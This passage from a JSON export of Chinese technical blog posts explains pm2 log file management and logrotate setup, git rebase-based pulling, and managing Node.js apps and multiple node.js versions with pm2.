  "body": "<p>\n<a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u81ea\u8eab\u7684\u65e5\u5fd7\u6587\u4ef6 ~\/.pm2\/pm2.log\uff0c\u4e0b\u9762\u8bb2\u7684\u662f <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> app\uff08\u5e94\u7528\uff09\u7684\u65e5\u5fd7\u6587\u4ef6\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u9ed8\u8ba4\u65e5\u5fd7<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u6bcf\u4e2a app\uff08\u5e94\u7528\uff09 \u4f1a\u751f\u6210 instances*2 \uff08\u5b9e\u4f8b\u6570\u00d72\uff09\u4e2a\u65e5\u5fd7\u6587\u4ef6\u3002\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> app \u7684\u6807\u51c6\u8f93\u51fa\u65e5\u5fd7\u6587\u4ef6 <\/dt><dd>~\/.pm2\/logs\/&lt;app name&gt;-out-&lt;instance id&gt;.log\n<\/dd>\n\n<dt> app \u7684\u9519\u8bef\u8f93\u51fa\u65e5\u5fd7\u6587\u4ef6 <\/dt><dd>~\/.pm2\/logs\/&lt;app name&gt;-error-&lt;instance id&gt;.log\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5408\u5e76\u8f93\u51fa\u7c7b\u578b\u65e5\u5fd7\uff08-l\uff09<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u6bcf\u4e2a app\uff08\u5e94\u7528\uff09 \u4f1a\u751f\u6210 instances+1 \uff08\u5b9e\u4f8b\u6570+1\uff09\u4e2a\u65e5\u5fd7\u6587\u4ef6\u3002\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> app \u7684\u65e5\u5fd7\u6587\u4ef6 <\/dt><dd>~\/.pm2\/logs\/&lt;app name&gt;-&lt;instance id&gt;.log\n<\/dd>\n<\/dl>\n\n<p>\n\u4e0d\u5f71\u54cd\u9ed8\u8ba4\u65e5\u5fd7\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u53ef\u4ee5\u6307\u5b9a\u5408\u5e76\u8f93\u51fa\u7c7b\u578b\u7684\u65e5\u5fd7\u6587\u4ef6\u540d\uff08-l app.log\uff09\n\n<p>\n\u8f93\u51fa\u65e5\u5fd7\u6587\u4ef6\u540d\u4e3a app-&lt;instance id&gt;.log\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5408\u5e76\u5b9e\u4f8b\u65e5\u5fd7\uff08&#x2013;merge-logs\uff09<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u540c\u4e00 app\uff08\u5e94\u7528\uff09\u7684\u6240\u6709 instances\uff08\u5b9e\u4f8b\uff09\u65e5\u5fd7\u6587\u4ef6\u653e\u5728\u4e00\u8d77\u3002\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> app \u7684\u9ed8\u8ba4\u6807\u51c6\u8f93\u51fa\u65e5\u5fd7\u6587\u4ef6 <\/dt><dd>~\/.pm2\/logs\/&lt;app name&gt;-out.log\n<\/dd>\n\n<dt> app \u7684\u9ed8\u8ba4\u9519\u8bef\u8f93\u51fa\u65e5\u5fd7\u6587\u4ef6 <\/dt><dd>~\/.pm2\/logs\/&lt;app name&gt;-error.log\n<\/dd>\n\n<dt> app \u7684\u5408\u5e76\u8f93\u51fa\u7c7b\u578b\u65e5\u5fd7\u6587\u4ef6 <\/dt><dd>~\/.pm2\/logs\/&lt;app name&gt;.log\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u7981\u6b62\u9ed8\u8ba4\u65e5\u5fd7<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li>\u7981\u6b62\u9ed8\u8ba4\u7684\u6807\u51c6\u8f93\u51fa\u65e5\u5fd7\u6587\u4ef6\uff08-o \/dev\/null\uff09\n<\/li>\n\n<li>\u7981\u6b62\u9ed8\u8ba4\u7684\u9519\u8bef\u8f93\u51fa\u65e5\u5fd7\u6587\u4ef6\uff08-e \/dev\/null\uff09\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u793a\u4f8b\uff1aapp \u751f\u6210\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6\u7b80\u5316\u65e5\u5fd7\u7ba1\u7406<\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 -n app -i 0 -l app.log -o \/dev\/null -e \/dev\/null --merge-logs start app.js\n<\/pre>\n<\/div>\n\n<p>\n\u8fd9\u6837\u53ea\u4f1a\u751f\u6210\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6 app.log\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">\u5b9a\u671f\u6e05\u7406\u65e5\u5fd7<\/h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<p>\n\u4e0d\u5efa\u8bae\u4f7f\u7528 <a href=\"https:\/\/www.npmjs.com\/package\/pm2-logrotate\">pm2-logrotate<\/a> \uff0c\u592a\u591a\u95ee\u9898\u4e86\uff08\u8be6\u89c1\uff1a <a href=\"http:\/\/blog.kankanan.com\/article\/63a75236-pm2-768465e55fd765874ef659275c0f.html#sec-1\">\u63a7\u5236pm2\u7684\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f<\/a> \uff09\u3002\n<\/p>\n\n<p>\n\u8fd8\u662f\u4f7f\u7528 logrotate \u670d\u52a1\u9760\u8c31\uff08\u53c2\u8003 <a href=\"http:\/\/pm2.keymetrics.io\/docs\/usage\/log-management\/#setting-up-a-native-logrotate\">Setting up a native logrotate<\/a> <a href=\"http:\/\/huoding.com\/2013\/04\/21\/246\">\u88ab\u9057\u5fd8\u7684Logrotate | \u706b\u4e01\u7b14\u8bb0<\/a>\uff09\uff1a\n<\/p>\n\n<p>\n<code>\/etc\/logrotate.d\/pm2-root<\/code>\n<\/p>\n<pre class=\"example\">\n\/root\/.pm2\/pm2.log \/root\/.pm2\/logs\/*.log {\n    daily\n    size 1M\n    rotate 10\n    create 600 nobody nobody\n    missingok\n    notifempty\n    compress\n    sharedscripts\n    copytruncate\n}\n<\/pre>\n<\/div>\n<\/div>\n"
},
{
  "title": "git\u591a\u4eba\u534f\u4f5c\uff1a\u7ef4\u62a4\u5e72\u51c0\u7684\u63d0\u4ea4\u6811",
  "timestamp": "2016-02-21 13:14:00",
  "tags": [
    "git"
  ],
  "body": "<p>\n\u5f88\u591a\u5f00\u6e90\u9879\u76ee\u662f\u88ab\u5f3a\u5236\u8981\u6c42\u7ef4\u62a4\u5e72\u51c0\u7684\u63d0\u4ea4\u6811\uff0c\u4e0a\u6e38\u5bb9\u6613\u5408\u5e76\u4f60\u901a\u8fc7 pull request \u63d0\u4ea4\u7684\u8865\u4e01\uff0c\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff0cpull \u4ee3\u7801\u65f6\u9700\u8981\u4f7f\u7528 rebase \u66ff\u6362\u9ed8\u8ba4\u7684 merge \u65b9\u5f0f\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git pull --rebase\n<\/pre>\n<\/div>\n\n<p>\ngit pull \u65f6\u81ea\u52a8\u8fdb\u884c rebase\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5168\u5c40\u5f00\u542f\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git config --global pull.rebase true\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5f53\u524d\u5206\u652f\u5f00\u542f\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git config branch.master.rebase true\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n\n<p>\n\u73b0\u5728\uff0c\u5982\u679c\u4f60\u7684\u5de5\u4f5c\u533a\u6709\u672a\u63d0\u4ea4\u7684\u4ee3\u7801\uff0c\u662f\u4e0d\u5141\u8bb8 pull \u7684\uff0c\u9700\u8981 stash \u5c06\u5de5\u4f5c\u533a\u6e05\u7406\u4e00\u4e0b\uff0c\u7b49 pull \u5b8c\u6210\u518d\u6062\u590d\u4e00\u4e0b\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git stash\ngit pull\ngit stash pop\n<\/pre>\n<\/div>\n\n<p>\n\u4f7f\u7528 rebase \u6a21\u5f0f\u76f8\u5bf9\u6765\u8bf4\u9ebb\u70e6\u4e00\u4e9b\uff0c\u4f46\u662f\u597d\u5904\u5c31\u662f\u4e2d\u5fc3\u4ed3\u5e93\u7684\u63d0\u4ea4\u5386\u53f2\u662f\u7ebf\u6027\u7684\uff0c\u7279\u522b\u662f\u901a\u8fc7 pull request \u63d0\u4ea4\u8865\u4e01\u6765\u534f\u4f5c\u5f00\u53d1\u7684\u65f6\u5019\uff0c\n\u63a5\u6536\u65b9\u968f\u65f6\u53ef\u4ee5\u5c06\u8865\u4e01\u5408\u5e76\u8fdb\u6765\uff0c\u5b8c\u5168\u6ca1\u6709 merge \u6a21\u5f0f\u5408\u5e76\u8865\u4e01\u90a3\u4e48\u9ebb\u70e6\u3002\u5f3a\u70c8\u5efa\u8bae\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528\u8fd9\u79cd\u6a21\u5f0f\u3002<\/p>\n"
},
{
  "title": "\u4f7f\u7528 pm2 \u7ba1\u7406\u5e94\u7528",
  "timestamp": "2016-02-25 15:18:00",
  "tags": [
    "node"
  ],
  "body": "<p>\npm2 \u662f\u4f7f\u7528 node.js \u5f00\u53d1\u7684\u8fdb\u7a0b\u7ba1\u7406\u5668\uff0c\u5b9e\u73b0\u7edf\u4e00\u65b9\u5f0f\u7ba1\u7406\u8fdb\u7a0b\uff0c\u5982\uff1a\u5d29\u6e83\u540e\u62c9\u8d77\u3001\u542f\u52a8\/\u505c\u6b62\u3001\u76d1\u63a7\u3001\u65e5\u5fd7\u7ba1\u7406\u7b49\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5b89\u88c5<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">npm install pm2@latest -g\n<\/pre>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">\u4e3a\u4ec0\u4e48\u8981\u5168\u5c40\uff08global\uff09\u65b9\u5f0f\u5b89\u88c5 pm2\uff1f<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<p>\npm2 \u88ab\u8bbe\u8ba1\u6210\u7ba1\u7406\u7528\u6237\u7684\u5168\u90e8\u5e94\u7528\uff0cpm2 \u7684\u6570\u636e\u4fdd\u5b58\u5728 ~\/.pm2 \u76ee\u5f55\u4e0b\uff0c\u540c\u4e00\u7528\u6237\u53ea\u80fd\u542f\u52a8\u4e00\u4e2a pm2 \u540e\u53f0\u8fdb\u7a0b\uff08PM2 daemon\uff09\uff0c\u4e0d\u540c\u7528\u6237\u7684 pm2 \u4e92\u4e0d\u5f71\u54cd\u3002\n\u4e0d\u5b89\u88c5\u4e3a\u5168\u5c40\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u5b89\u88c5\u591a\u4e2a\u7248\u672c\u7684 pm2\uff0c\u4e0d\u540c\u7248\u672c\u7684 pm2 \u524d\u7aef\u5de5\u5177\u7a0b\u5e8f\u4e0e pm2 \u540e\u53f0\u8fdb\u7a0b\uff08PM2 daemon\uff09\u4ea4\u4e92\u662f\u6709\u98ce\u9669\u7684\u3002\n<\/p>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5e94\u7528\u7ba1\u7406<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>\u542f\u52a8\u5e94\u7528\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 start -n app1 app1.js\npm2 start -n app2 app2.js\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5217\u51fa\u5e94\u7528\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 list\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5e94\u7528\u8be6\u60c5\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 describe app1\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u505c\u6b62\u5e94\u7528\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 stop app1\npm2 stop app2\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5220\u9664\u5e94\u7528\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 delete app1\npm2 delete app2\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5f00\u673a\u542f\u52a8<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u5e94\u7528\u542f\u52a8\u540e\u9700\u8981\u4fdd\u5b58\uff0c\u5e94\u7528\u624d\u4f1a\u5728\u5f00\u673a\u540e\u7531 pm2 \u670d\u52a1\u542f\u52a8\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 save\n<\/pre>\n<\/div>\n\n<p>\n\u521b\u5efa pm2 \u7cfb\u7edf\u670d\u52a1\uff0c\u5f00\u673a\u542f\u52a8 pm2\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo pm2 startup systemd -u app\n<\/pre>\n<\/div>\n\n<p>\n\u4e0d\u91cd\u542f\u8bd5\u8fd0\u884c\u4e00\u4e0b\uff0c\u770b\u662f\u5426\u6b63\u5e38\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#28165;&#31354;&#36827;&#31243;&#24182;&#36864;&#20986; pm2&#65292;&#22238;&#21040;&#24178;&#20928;&#30340;&#31995;&#32479;&#29366;&#24577;<\/span>\nsudo systemctl stop pm2\nps aux | grep node\n\n<span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#21551;&#21160; pm2 &#26381;&#21153;&#65292;&#39564;&#35777;&#19968;&#19979;&#24212;&#29992;&#26159;&#21542;&#27491;&#24120;&#21551;&#21160;<\/span>\nsudo systemctl start pm2\npm2 list\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u65e5\u5fd7\u7ba1\u7406<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n\u300a <a href=\"http:\/\/blog.kankanan.com\/article\/pm2-768465e55fd77ba17406.html\">pm2\u7684\u65e5\u5fd7\u7ba1\u7406<\/a> \u300b\u6709\u8be6\u7ec6\u63cf\u8ff0\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u591a node.js \u7248\u672c\u5171\u5b58<\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\npm2 \u672c\u8eab\u5c31\u662f node.js \u5f00\u53d1\u7684\u7a0b\u5e8f\uff0c\u4f9d\u8d56 node.js\uff0cpm2 \u5e94\u7528\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u7248\u672c\u7684 node.js\u3002\n<\/p>\n\n<p>\npm2 \u547d\u4ee4\u884c\u5de5\u5177\u4f1a\u901a\u8fc7\u201c#!\/usr\/bin\/env node\u201d\u65b9\u5f0f\u5f15\u7528 node\uff0c\u5982\u679c\u5e94\u7528\u4e5f\u4ee5\u540c\u6837\u7684\u65b9\u5f0f\u5f15\u7528 node.js\uff0c\u5c31\u8981\u968f\u65f6\u6ce8\u610f\u5207\u6362 node.js \u7248\u672c\uff0c\u4e00\u4e0d\u5c0f\u5fc3 pm2 \u547d\u4ee4\u884c\u5de5\u5177\u548c pm2 \u5e94\u7528\u4f7f\u7528\u7684 node.js \u7248\u672c\u4f1a\u9519\u4e71\uff0c\u6709\u4e00\u5b9a\u98ce\u9669\u6027\u3002\u4e00\u4e2a node.js \u7248\u672c\u5b89\u88c5\u7684\u6a21\u5757\u4e0d\u80fd\u4fdd\u8bc1\u4e0e\u53e6\u4e00\u4e2a node.js \u7248\u672c\u517c\u5bb9\uff0c\u7279\u522b\u662f\u4e00\u4e9b c++ \u6269\u5c55\u6a21\u5757\u3002\n<\/p>\n\n<p>\n\u6211\u4ee5\u524d\u7684\u5b9e\u8df5\u4e2d\uff0c\u5e94\u7528\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u73af\u5883\u811a\u672c .bashrc \uff0c\u5728\u64cd\u4f5c\u67d0\u4e2a\u5e94\u7528\u65f6\uff0c\u603b\u662f\u4f1a\u901a\u8fc7 <code>source .bashrc<\/code> \u5148\u8bbe\u7f6e\u5e94\u7528\u7684 shell \u73af\u5883\u53d8\u91cf\uff0c\u901a\u8fc7 $PATH \u73af\u5883\u53d8\u91cf\u6307\u5b9a node \u547d\u4ee4\u4e3a\u5e94\u7528\u6240\u9700\u7684 node.js \u7248\u672c\u4e0d\u662f\u4e00\u4e2a\u597d\u4e3b\u610f\uff0c\u5f53\u64cd\u4f5c pm2 \u65f6\uff0cpm2 \u4e5f\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u5e94\u7528\u7684 node.js \u7248\u672c\u3002\n<\/p>\n\n<p>\n\u4ece\u8fd9\u4e00\u70b9\u4e0a\u770b\uff0c\u4e0d\u5e94\u8be5\u4f7f\u7528 node.js \u3001php\u3001python\u3001ruby \u4e4b\u7c7b\u7684\u811a\u672c\u8bed\u8a00\u6765\u5f00\u53d1\u8fdb\u7a0b\u7ba1\u7406\u5668\uff0c\u5b83\u672c\u8eab\u7684\u4f9d\u8d56\u7ba1\u7406\u5c31\u662f\u4e2a\u5927\u9ebb\u70e6\uff0c\u4f7f\u7528 go\u3001c \u6216 c++ \u6765\u5f00\u53d1\u4f1a\u597d\u5f97\u591a\u3002\n<\/p>\n\n<p>\n\u7406\u60f3\u60c5\u51b5\u4e0b\uff0cpm2 \u548c \u5e94\u7528\uff08app\uff09\u603b\u662f\u4f7f\u7528\u6b63\u786e\u7684 node.js \u7248\u672c\uff0c\u53ef\u4ee5\u5f52\u4e3a\u4ee5\u4e0b\u4e09\u79cd\u60c5\u5f62\u3002\u65b0\u5e94\u7528\u5e94\u8be5\u603b\u662f\u5047\u8bbe\u5e03\u7f72\u73af\u5883\u4e3a\u60c5\u5f62 1\uff0c\u4e0d\u8981\u8fc7\u591a\u8003\u8651\u7cfb\u7edf\u8fd0\u884c\u7684 node.js \u7248\u672c\uff0c\u8fd9\u4e5f\u5c31\u8981\u6c42\u5e94\u7528\u80fd\u591f\u517c\u5bb9\u5404\u79cd node.js \u7248\u672c\uff0c\u4f46\u662f\u73b0\u5b9e\u60c5\u51b5\u662f\uff0cnode.js \u4ee5\u53ca javascript \u53d1\u5c55\u5f97\u592a\u5feb\u4e86\uff0c\u5e94\u7528\u4f9d\u8d56\u7684\u5404\u79cd node.js \u6a21\u5757\u4e5f\u5f80\u5f80\u505a\u4e0d\u5230\u517c\u5bb9\u5404\u79cd node.js \u7248\u672c\uff0c\u5f88\u591a\u6a21\u5757\u57fa\u4e8e\u5b9e\u73b0\u7684\u7b80\u6d01\u6027\u8003\u8651\uff0c\u63d0\u4f9b\u591a\u4e2a\u7248\u672c\u5206\u522b\u5bf9\u5e94\u4e0d\u540c\u7684 node.js \u7248\u672c\uff0c\u5bfc\u81f4\u5e94\u7528\u4e5f\u5fc5\u987b\u4ece\u4e00\u5f00\u59cb\u5c31\u9009\u62e9\u7279\u5b9a\u7684 node.js \u7248\u672c\uff0c\u4e0d\u540c\u56e2\u961f\u3001\u4eba\u5458\u53ca\u9879\u76ee\u8ddf\u8fdb\u65b0\u6280\u672f\u6b65\u8c03\u4e0d\u4e00\u81f4\u65f6\uff0c\u60c5\u5f62 2 \u53ca\u60c5\u5f62 3 \u662f\u73b0\u5b9e\u7684\u9009\u62e9\u3002\n<\/p>\n<\/div>\n\n<div id=\"outline-container-sec-5-1\" class=\"outline-3\">\n<h3 id=\"sec-5-1\">\u60c5\u5f62 1\uff1a\u7cfb\u7edf\u4e2d\u53ea\u6709\u4e00\u4e2a node.js \u7248\u672c\uff0c\u5e76\u4e14\u662f\u5168\u5c40\u5b89\u88c5<\/h3>\n<div class=\"outline-text-3\" id=\"text-5-1\">\n<p>\n\u5728\u4e13\u673a\u4e13\u7528\u7684\u751f\u4ea7\u73af\u5883\u4e0b\uff0c\u8fd9\u79cd\u60c5\u5f62\u4f1a\u5f88\u5e38\u89c1\uff0c\u7279\u522b\u662f docker \u5bb9\u5668\u73af\u5883\u4e0b\u3002\n<\/p>\n\n<p>\n\u8fd9\u662f\u6700\u7b80\u5355\u7684\u4e00\u79cd\u60c5\u51b5\uff0c\u4e0d\u9700\u8981\u4e3a node.js \u7248\u672c\u64cd\u5fc3\uff0c\u6574\u4e2a\u5f00\u53d1\u7ec4\u7ec7\u5728 node.js \u7248\u672c\u9009\u62e9\u4e0a\u5171\u8fdb\u9000\uff0c\u4fdd\u6301\u4e00\u81f4\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5-2\" class=\"outline-3\">\n<h3 id=\"sec-5-2\">\u60c5\u5f62 2\uff1a\u7cfb\u7edf\u4e2d\u6709\u4e00\u4e2a\u5168\u5c40 node.js \u7248\u672c\uff0c\u5e94\u7528\u6709\u81ea\u5df2\u7684 node.js \u7248\u672c<\/h3>\n<div class=\"outline-text-3\" id=\"text-5-2\">\n<p>\n\u5f00\u53d1\u73af\u5883\u4e0b\uff0c\u6216\u8005\u540c\u4e00\u673a\u5668\u90e8\u7f72\u5927\u91cf\u5fae\u670d\u52a1\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u822c\u5c31\u662f\u8fd9\u79cd\u60c5\u5f62\u3002\n<\/p>\n\n<p>\n\u8fd9\u662f\u6700\u590d\u6742\u7684\u4e00\u79cd\u60c5\u51b5\uff0c\u5728\u8fd0\u884c\u5e94\u7528\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u8981\u786e\u4fdd\u5207\u5230\u5e94\u7528\u6240\u9700\u7684 node.js \u7248\u672c\uff0c\u5728\u6267\u884c pm2 \u64cd\u4f5c\u7684\u65f6\u5019\uff0c\u8981\u786e\u4fdd\u5207\u5230 pm2 \u6240\u9700\u7684 node.js \u7248\u672c\uff0c\u6709\u5982\u5c65\u8584\u51b0\u7684\u611f\u89c9\u3002\n<\/p>\n\n<p>\nnode.js \u7248\u672c\u9700\u8981\u5728\u4ee5\u4e0b\u65b9\u9762\u6b63\u786e\u5339\u914d\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>pm2 \u7684 node.js \u7248\u672c\n\n<p>\npm2 \u672c\u8eab\u5c31\u662f\u4e00\u5957\u7528\u6237\u5168\u5c40\u7684\u8fdb\u7a0b\u7ba1\u7406\u5de5\u5177\uff0c\u4f7f\u7528\u5168\u5c40\u7684 node.js \u7248\u672c\u662f\u81ea\u7136\u800c\u7136\u7684\u9009\u62e9\u3002\n<\/p>\n\n<p>\n\u5426\u5219\u5c31\u4e00\u5b9a\u8981\u8bb0\u5f97\u4f7f\u7528\u6b63\u786e\u7684 node.js \u7248\u672c\u8fd0\u884c pm2\uff1a\/usr\/local\/node-v5.0.0\/bin\/node pm2 list\uff0c\u5f88\u662f\u4e0d\u4fbf\u3002\n<\/p>\n<\/li>\n\n<li>\u5e94\u7528\u7684 node.js \u7248\u672c\n\n<p>\n\u5efa\u8bae\u4f7f\u7528 <code>--interpreter<\/code> \u9009\u9879\u6307\u5b9a node.js \u7248\u672c\uff0c\u53c2\u89c1\u8ba8\u8bba\uff1a<a href=\"https:\/\/github.com\/Unitech\/PM2\/issues\/1034\">Using different versions of node via nvm for each app \u00b7 Issue #1034 \u00b7 Unitech\/pm2<\/a> \u3002\n<\/p>\n\n<p>\n\u8fd9\u662f\u6700\u5173\u952e\u7684\u4e00\u70b9\uff0c\u5e94\u7528\u7684 node.js \u7248\u672c\u4e0d\u5bf9\uff0c\u53ef\u80fd\u5bfc\u81f4\u5e94\u7528\u542f\u52a8\u5931\u8d25\uff0c\u4e2d\u65ad\u670d\u52a1\u3002\n<\/p>\n<\/li>\n\n<li>\u5e94\u7528\u7684\u8f85\u52a9\u811a\u672c\u7684 node.js \u7248\u672c\n\n<p>\n\u4f7f\u7528 node.js \u5f00\u53d1\u7684\u5e94\u7528\u9644\u5e26\u547d\u4ee4\u884c\u5de5\u5177\u8fd0\u884c\u65f6\u5982\u679c node.js \u7248\u672c\u4e0d\u5bf9\uff0c\u901a\u5e38\u4e0d\u4f1a\u5bf9\u8fd0\u884c\u4e2d\u7684\u670d\u52a1\u9020\u6210\u5f71\u54cd\u3002\n<\/p>\n\n<p>\n\u53ef\u4ee5\u7b80\u5355\u5730\u5199\u4e00\u4e9b shell \u811a\u672c\u5c01\u88c5\uff0c\u5728 shell \u811a\u672c\u4e2d\u6307\u5b9a\u6b63\u786e\u7684 node.js \u7248\u672c\uff0c\u5982\uff1a\n<\/p>\n\n<p>\n<code>dump.sh<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/<\/span><span style=\"color: #99cc99;\">bash<\/span>\n\n\/usr\/local\/node-v5.0.0\/bin\/node .\/dump.js\n<\/pre>\n<\/div>\n\n<p>\n\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728 node.js \u811a\u672c\u4e2d\u5f15\u7528\u6b63\u786e\u7684 node.js \u7248\u672c\uff0c\u5982\uff1a\n<\/p>\n\n<p>\n<code>dump.js<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">#!\/usr\/local\/node-v5.0.0\/bin\/node\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">fs<\/span> = require(<span style=\"color: #66cccc;\">'fs'<\/span>);\n...\n<\/pre>\n<\/div>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">chmod a+x dump.js\n.\/dump.js\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5-3\" class=\"outline-3\">\n<h3 id=\"sec-5-3\">\u60c5\u5f62 3\uff1a\u7cfb\u7edf\u6ca1\u6709\u5168\u5c40 node.js \u7248\u672c\uff0c\u5e94\u7528\u5404\u81ea\u7ef4\u62a4 node.js \u7248\u672c<\/h3>\n<div class=\"outline-text-3\" id=\"text-5-3\">\n<p>\n\u8fd9\u662f\u4e0a\u9762\u60c5\u51b5\u7684\u7b80\u5316\u7248\uff0c\u8003\u9a8c\u5f00\u53d1\u3001\u8fd0\u7ef4\u56e2\u961f\u7684\u7eaa\u5f8b\u6027\u3002\n<\/p>\n\n<p>\n\u7531\u4e8e $PATH \u4e2d\u6ca1\u6709 node.js\uff0c\u4e0d\u4f1a\u7531\u4e8e\u6ca1\u6709\u6307\u5b9a node.js \u7edd\u5bf9\u8def\u5f84\u65e0\u610f\u95f4\u5f15\u7528\u9519\u8bef\u7684 node.js \u7248\u672c\u3002\n<\/p>\n\n<p>\n\u53ef\u4ee5\u628a node.js \u5b89\u88c5\u5728\u5e94\u7528\u6839\u76ee\u5f55\u4e0b\uff0c\u5982\u4e0b\u76ee\u5f55\u7ed3\u6784\u6240\u793a\uff1a\n<\/p>\n\n<pre class=\"example\">\nApplications\n|\n|\n|--- Application 1\n|         |\n|         |--------- node\n|         |\n|         |--------- package.json\n|         |\n|         |--------- ...\n|\n|    \n|--- Application 2\n|         |\n|         |--------- node\n|         |\n|         |--------- package.json\n|         |\n|         |--------- ...\n|\n|\n|--- Application 3\n|         |\n|         |--------- node\n|         |\n|         |--------- package.json\n|         |\n|         |--------- ...\n|\n<\/pre>\n\n<p>\n\u751a\u81f3 pm2 \u4e5f\u901a\u8fc7\u4ee5\u4e0a\u65b9\u5f0f\u5b89\u88c5\u81ea\u5df2\u7684 node.js \u7248\u672c\u3002\n<\/p>\n\n<p>\n\u901a\u8fc7 .\/node\/bin\/node \u5f15\u7528 node.js \u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u4e0d\u8981\u8bd5\u56fe\u901a\u8fc7\u5c06 .\/node\/bin \u76ee\u5f55\u52a0\u5230 $PATH \u4e2d\u4ee5\u7b80\u5316\u4f7f\u7528\uff0c\u5426\u5219\u64cd\u4f5c\u4e0d\u540c\u5e94\u7528\u6216 pm2 \u65f6\uff0c\u53c8\u4f1a\u4e00\u4e0d\u5c0f\u5fc3\u5f15\u7528\u5230\u9519\u8bef\u7684 node.js 